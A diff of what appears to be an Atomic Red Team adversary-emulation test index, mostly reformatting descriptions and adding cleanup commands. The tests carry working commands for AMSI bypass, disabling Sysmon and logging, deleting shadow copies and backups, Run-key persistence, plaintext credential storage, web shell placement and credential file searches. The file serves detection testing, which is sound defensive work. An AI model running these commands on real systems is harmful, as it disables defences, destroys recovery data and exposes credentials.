@@ -4993,6 +4993,9 @@ persistence:
         command: 'xcopy #{web_shells} #{web_shell_path}
 
 '
+        cleanup_command: 'del #{web_shell_path}
+
+'
   T1084:
     technique:
       x_mitre_permissions_required:
@@ -7102,8 +7105,10 @@ defense-evasion:
 
 '
     - name: Unload Sysmon Filter Driver
-      description: "Unloads the Sysinternals Sysmon filter driver without stopping
-        the Sysmon service. \n"
+      description: 'Unloads the Sysinternals Sysmon filter driver without stopping
+        the Sysmon service.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -7126,9 +7131,9 @@ defense-evasion:
           fltmc.exe load #{sysmon_driver}
           sc start sysmon
     - name: Disable Windows IIS HTTP Logging
-      description: "Disables HTTP logging on a Windows IIS web server as seen by Threat
-        Group 3390 (Bronze Union). \nThis action requires HTTP logging configurations
-        in IIS to be unlocked.\n"
+      description: |
+        Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
+        This action requires HTTP logging configurations in IIS to be unlocked.
       supported_platforms:
       - windows
       input_arguments:
@@ -7137,9 +7142,17 @@ defense-evasion:
           type: string
           default: Default Web Site
       executor:
-        name: command_prompt
+        name: powershell
+        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {0}
+          else {1}
+
+'
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
           /section:httplogging /dontLog:true
+
+'
+        cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
+          /section:httplogging /dontLog:false
 
 '
     - name: Uninstall Sysmon
@@ -7161,8 +7174,9 @@ defense-evasion:
 
 '
     - name: AMSI Bypass - AMSI InitFailed
-      description: "Any easy way to bypass AMSI inspection is it patch the dll in
-        memory setting the \"amsiInitFailed\" function to true. \nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n"
+      description: |
+        Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+        https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
       supported_platforms:
       - windows
       executor:
@@ -7171,9 +7185,9 @@ defense-evasion:
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
         cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
     - name: AMSI Bypass - Remove AMSI Provider Reg Key
-      description: "With administrative rights, an adversary can remove the AMSI Provider
-        registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis
-        test removes the Windows Defender provider registry key. \n"
+      description: |
+        With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+        This test removes the Windows Defender provider registry key.
       supported_platforms:
       - windows
       executor:
@@ -7188,8 +7202,10 @@ defense-evasion:
 
 '
     - name: Disable Arbitrary Security Windows Service
-      description: "With administrative rights, an adversary can disable Windows Services
-        related to security products. \n"
+      description: 'With administrative rights, an adversary can disable Windows Services
+        related to security products.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -7207,8 +7223,10 @@ defense-evasion:
           sc.exe config #{service_name} start= auto
           net.exe start #{service_name}
     - name: Disable PowerShell Script Block Logging
-      description: "An adversary may disable PowerShell Script Block Logging to avoid
-        leaving evidence. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
@@ -7225,14 +7243,18 @@ defense-evasion:
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
     - name: PowerShell Bypass of AntiMalware Scripting Interface
-      description: "An adversary may bypass Windows Defender AMSI to execute malicious
-        PowerShell code. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
+        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
+
+'
   T1107:
     technique:
       x_mitre_data_sources:
@@ -7343,17 +7365,12 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd\a
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f #{file_to_delete}
-
-'
+        command: |
+          echo "T1107" > %temp%\T1107.txt
+          del /f  %temp%\T1107.txt
     - name: Delete an entire folder - Windows cmd
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
@@ -7361,34 +7378,24 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        folder_to_delete:
-          description: Path of folder to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f /S #{folder_to_delete}
-
-'
+        command: |
+          mkdir %temp%\T1107
+          rmdir /s /q %temp%\T1107
     - name: Delete a single file - Windows PowerShell
       description: 'Delete a single file from the temporary directory using Powershell
 
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-ps\a
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{file_to_delete}"
-
-'
+        command: |
+          New-Item $env:TEMP\T1107.txt
+          Remove-Item -path $env:TEMP\T1107.txt
     - name: Delete an entire folder - Windows PowerShell
       description: 'Recursively delete the temporary directory and all files contained
         within it using Powershell
@@ -7404,9 +7411,9 @@ defense-evasion:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{folder_to_delete}" -recurse
-
-'
+        command: |
+          New-Item $env:TEMP\T1107 -ItemType Directory
+          Remove-Item -path $env:TEMP\T1107 -recurse
     - name: Delete VSS - vssadmin
       description: 'Delete all volume shadow copies with vssadmin.exe
 
@@ -7439,11 +7446,14 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
+        elevation_required: true
         command: |
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: "This test deletes Windows Backup catalogs. \n"
+      description: 'This test deletes Windows Backup catalogs.
+
+'
       supported_platforms:
       - windows
       executor:
@@ -9488,9 +9498,13 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
           /t REG_DWORD /v HideFileExt /d 1 /f
+
+'
+        cleanup_command: 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+          /v HideFileExt /f
 
 '
     - name: Modify Registry of Local Machine - cmd
@@ -9504,6 +9518,10 @@ defense-evasion:
         elevation_required: true
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
+
+'
+        cleanup_command: 'reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+          /v SecurityHealth /f
 
 '
     - name: Modify Registry of Another User Profile
@@ -9570,9 +9588,10 @@ defense-evasion:
           [gc]::Collect()
           reg unload "HKU\$($ProfileList[$p].SID)"
     - name: Modify registry to store logon credentials
-      description: "Sets registry key that will tell windows to store plaintext passwords
+      description: 'Sets registry key that will tell windows to store plaintext passwords
         (making the system vulnerable to clear text / cleartext password dumping)
-        \n"
+
+'
       supported_platforms:
       - windows
       executor:
@@ -9616,7 +9635,9 @@ defense-evasion:
           $EncodedCommand
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
         cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}'
+          -Name #{registry_entry_storage}
+
+'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -14944,6 +14965,9 @@ privilege-escalation:
         command: 'xcopy #{web_shells} #{web_shell_path}
 
 '
+        cleanup_command: 'del #{web_shell_path}
+
+'
 impact:
   T1531:
     technique:
@@ -19261,19 +19285,6 @@ credential-access:
         command: 'grep -ri password #{file_path}
 
 '
-    - name: Runs Mimikatz & Mimikittenz by name
-      description: 'Mimikatz/kittenz - This will require a Mimikatz executable or
-        invoke-mimikittenz ps module.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          invoke-mimikittenz
-          mimikatz.exe
     - name: Extracting passwords with findstr
       description: 'Extracting Credentials from Files
 
@@ -19286,7 +19297,7 @@ credential-access:
         command: |
           findstr /si pass *.xml | *.doc | *.txt | *.xls
           ls -R | select-string -Pattern password
-    - name: Access "unattend.xml"
+    - name: Access unattend.xml
       description: 'Attempts to access unattend.xml, where credentials are commonly
         stored, within the Panther directory where installation logs are stored.
 
@@ -19297,8 +19308,8 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          cmd /c type C:\Windows\Panther\unattend.xml > nul 2>&1
-          cmd /c type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
   T1214:
     technique:
       x_mitre_permissions_required:
@@ -21416,7 +21427,6 @@ execution:
     - name: Invoke-AppPathBypass
       description: |
         Note: Windows 10 only
-
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
       supported_platforms:
       - windows
